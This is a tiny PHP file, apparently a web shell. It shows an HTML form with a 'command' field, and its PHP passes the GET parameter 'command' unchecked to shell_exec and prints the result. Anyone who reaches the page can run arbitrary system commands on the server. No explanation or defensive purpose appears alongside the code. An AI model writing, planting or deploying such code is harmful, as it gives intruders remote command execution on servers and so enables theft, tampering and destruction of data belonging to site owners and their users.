<form name="red">
<p>Command: <input type="text" name="command" /></p>
</form>
<?php
$NAME = $_GET['command'];
//echo $NAME;
$output = shell_exec($NAME);

echo "$output";

?>
